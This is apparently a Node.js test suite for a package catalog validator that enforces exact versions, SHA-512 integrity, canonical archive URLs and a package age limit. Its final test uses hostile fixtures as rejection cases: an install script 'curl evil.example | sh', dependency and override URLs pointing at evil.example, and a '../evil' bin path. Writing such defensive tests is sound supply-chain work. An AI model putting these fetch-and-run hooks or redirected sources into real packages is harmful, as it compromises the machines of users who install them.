import assert from "node:assert/strict";
import test from "node:test";

import {
  CATALOG_SCHEMA,
  MINIMUM_AGE_SECONDS,
  REGISTRY_ALIAS,
  canonicalNpmArchiveUrl,
  selectInstallManifest,
  validateCatalog,
} from "../src/catalog.js";

const sri = (byte) => `sha512-${Buffer.alloc(64, byte).toString("base64")}`;
const sha = (byte, length) => byte.repeat(length);

function npmSource({ name = "@scope/helper", version = "1.2.3", byte = "1" } = {}) {
  return {
    bytes: 1234,
    fetchedAt: "2026-08-24T00:00:00.000Z",
    integrity: sri(Number(byte)),
    kind: "npmjs",
    metadataSha256: sha("a", 64),
    sha1: sha(byte, 40),
    sha256: sha(byte, 64),
    url: canonicalNpmArchiveUrl(name, version),
  };
}

function firstPartySource() {
  return {
    bytes: 4321,
    commit: sha("c", 40),
    integrity: sri(2),
    kind: "first-party",
    repository: "https://github.com/pkgre/pkgre",
    sha1: sha("2", 40),
    sha256: sha("2", 64),
    tag: "js/v0.1.0",
    tagObject: sha("d", 40),
    url: `https://js.pkg.re/packages/${sha("2", 64)}.tgz`,
  };
}

function validCatalog() {
  return {
    evaluationTime: "2026-08-25T00:00:00.000Z",
    minimumAgeSeconds: MINIMUM_AGE_SECONDS,
    packages: [
      {
        distTags: { latest: "1.2.3" },
        name: "@scope/helper",
        versions: [
          {
            admittedAt: "2026-08-25T00:00:00.000Z",
            manifest: {
              license: "MIT",
              name: "@scope/helper",
              version: "1.2.3",
            },
            publishedAt: "2020-01-01T00:00:00.000Z",
            source: npmSource(),
            version: "1.2.3",
          },
        ],
      },
      {
        distTags: { latest: "0.1.0" },
        name: "pkgre-js",
        versions: [
          {
            admittedAt: "2026-08-25T00:00:00.000Z",
            manifest: {
              bin: { "pkgre-js": "src/main.js" },
              dependencies: { "@scope/helper": "1.2.3" },
              engines: { node: ">=24.15.0", npm: ">=12.0.2" },
              exports: { ".": "./src/main.js" },
              license: "Apache-2.0",
              name: "pkgre-js",
              type: "module",
              version: "0.1.0",
            },
            publishedAt: "2026-08-25T00:00:00.000Z",
            source: firstPartySource(),
            version: "0.1.0",
          },
        ],
      },
    ],
    registry: REGISTRY_ALIAS,
    schema: CATALOG_SCHEMA,
  };
}

function mutation(path, value) {
  const catalog = validCatalog();
  let target = catalog;
  for (const component of path.slice(0, -1)) target = target[component];
  target[path.at(-1)] = value;
  return catalog;
}

test("selects only audited install-time package manifest fields", () => {
  assert.deepEqual(
    selectInstallManifest({
      description: "fixture",
      files: ["src"],
      name: "pkgre-js",
      repository: { type: "git", url: "https://example.invalid/repository" },
      scripts: { test: "node --test" },
      version: "0.1.0",
    }, "pkgre-js", "0.1.0"),
    { description: "fixture", name: "pkgre-js", version: "0.1.0" },
  );
  assert.throws(() => selectInstallManifest({ dependencies: { helper: "^1.0.0" }, name: "pkgre-js", version: "0.1.0" }, "pkgre-js", "0.1.0"), /one exact canonical version/);
});

test("accepts one closed exact-version catalog and canonical npm archive paths", () => {
  const catalog = validCatalog();
  assert.equal(validateCatalog(catalog), catalog);
  assert.equal(canonicalNpmArchiveUrl("is-number", "7.0.0"), "https://registry.npmjs.org/is-number/-/is-number-7.0.0.tgz");
  assert.equal(canonicalNpmArchiveUrl("@scope/helper", "1.2.3-beta.1+build"), "https://registry.npmjs.org/@scope/helper/-/helper-1.2.3-beta.1+build.tgz");
});

test("requires exact schema,ordering,inventory,and closed source forms", () => {
  const cases = [
    [mutation(["schema"], "pkgre-js-catalog-v2"), /catalog.schema/],
    [mutation(["registry"], "other"), /catalog.registry/],
    [mutation(["minimumAgeSeconds"], MINIMUM_AGE_SECONDS - 1), /minimumAgeSeconds/],
    [mutation(["packages", 0, "name"], "Helper"), /invalid unscoped package/],
    [mutation(["packages", 0, "distTags", "latest"], "2.0.0"), /latest tag names an absent version/],
    [mutation(["packages", 0, "versions", 0, "version"], "01.2.3"), /invalid canonical SemVer/],
    [mutation(["packages", 0, "versions", 0, "source", "kind"], "git"), /source.kind/],
    [mutation(["packages", 0, "versions", 0, "source", "url"], "https://evil.example/helper.tgz"), /canonical npm archive URL/],
    [mutation(["packages", 1, "versions", 0, "source", "repository"], "https://evil.example/pkgre"), /first-party repository/],
    [mutation(["packages", 1, "versions", 0, "source", "url"], "https://js.pkg.re/packages/other.tgz"), /content-addressed/],
  ];
  const reversed = validCatalog();
  reversed.packages.reverse();
  cases.push([reversed, /strictly sorted by name/]);
  const extra = validCatalog();
  extra.extra = true;
  cases.push([extra, /catalog keys must be exactly/]);
  for (const [catalog, expected] of cases) assert.throws(() => validateCatalog(catalog), expected);
});

test("rejects malformed integrity,evidence time,and route collisions", () => {
  const cases = [
    [mutation(["packages", 0, "versions", 0, "source", "integrity"], `sha256-${Buffer.alloc(32).toString("base64")}`), /SHA-512 SRI/],
    [mutation(["packages", 0, "versions", 0, "source", "integrity"], `${sri(1)} sha1-deadbeef`), /SHA-512 SRI/],
    [mutation(["packages", 0, "versions", 0, "source", "sha1"], sha("A", 40)), /lowercase SHA-1/],
    [mutation(["packages", 0, "versions", 0, "publishedAt"], "2026-08-01T00:00:00.000Z"), /younger than 30 days/],
    [mutation(["packages", 0, "versions", 0, "source", "fetchedAt"], "2019-01-01T00:00:00.000Z"), /nonmonotonic npm evidence/],
    [mutation(["packages", 0, "versions", 0, "admittedAt"], "2026-08-26T00:00:00.000Z"), /nonmonotonic evidence/],
    [mutation(["packages", 0, "versions", 0, "publishedAt"], "2020-01-01T00:00:00Z"), /canonical UTC timestamp/],
  ];
  const collision = validCatalog();
  collision.packages[1].versions[0].source.sha256 = collision.packages[0].versions[0].source.sha256;
  collision.packages[1].versions[0].source.url = `https://js.pkg.re/packages/${collision.packages[0].versions[0].source.sha256}.tgz`;
  cases.push([collision, /archive route collision/]);
  for (const [catalog, expected] of cases) assert.throws(() => validateCatalog(catalog), expected);
});

test("rejects remote dependency sources,unknown closure,and install-time attack fields", () => {
  for (const source of ["^1.2.3", "https://evil.example/package.tgz", "git+https://example/repo", "file:../package", "workspace:*", "npm:other@1.2.3"]) {
    const catalog = mutation(["packages", 1, "versions", 0, "manifest", "dependencies", "@scope/helper"], source);
    assert.throws(() => validateCatalog(catalog), /must be one exact canonical version/);
  }
  assert.throws(
    () => validateCatalog(mutation(["packages", 1, "versions", 0, "manifest", "dependencies", "@scope/helper"], "1.2.4")),
    /names absent/,
  );
  for (const [field, value] of [
    ["scripts", { install: "curl evil.example | sh" }],
    ["bundledDependencies", ["@scope/helper"]],
    ["overrides", { "@scope/helper": "https://evil.example/package.tgz" }],
  ]) {
    const catalog = validCatalog();
    catalog.packages[1].versions[0].manifest[field] = value;
    assert.throws(() => validateCatalog(catalog), /unsupported key/);
  }
  const badBin = validCatalog();
  badBin.packages[1].versions[0].manifest.bin["pkgre-js"] = "../evil";
  assert.throws(() => validateCatalog(badBin), /package-relative path/);
});
